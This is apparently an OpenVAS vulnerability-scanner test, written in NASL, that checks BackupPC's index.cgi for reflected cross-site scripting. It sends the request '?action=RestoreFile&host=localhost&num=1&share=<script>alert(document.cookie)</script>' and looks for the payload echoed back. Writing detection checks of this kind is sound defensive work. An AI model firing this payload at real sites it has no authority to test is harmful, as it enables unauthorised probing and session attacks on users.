##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_backuppc_index_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# BackupPC 'index.cgi' Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "BackupPC version 3.2.1 and prior";
tag_insight = "Multiple flaws are due to improper validation of user-supplied input
  to 'num' and 'share' parameters in index.cgi, which allows attackers to
  execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.";
tag_solution = "No solution or patch is available as of 4th April, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://backuppc.sourceforge.net/";
tag_summary = "This host is running BackupPC and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(802622);
  script_version("$Revision: 12 $");
  script_bugtraq_id(47628, 50406);
  script_cve_id("CVE-2011-3361", "CVE-2011-5081", "CVE-2011-4923");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-04 14:49:38 +0530 (Wed, 04 Apr 2012)");
  script_name("BackupPC 'index.cgi' Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44259");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44385");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46615");
  script_xref(name : "URL" , value : "http://www.ubuntu.com/usn/usn-1249-1");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/67170");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71030");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/multiple_xss_vulnerabilities_in_backuppc.html");

  script_description(desc);
  script_summary("Check if BackupPC is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = 0;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("/backuppc", "", cgi_dirs()))
{
  url = dir + "/index.cgi";

  ## Confirm the application before trying exploit
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<title>BackupPC"))
  {
    ## Construct the Attack Request
    url += "?action=RestoreFile&host=localhost&num=1&share=" +
           "<script>alert(document.cookie)</script>";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document.cookie\)</script>",
       extra_check:"<title>BackupPC"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
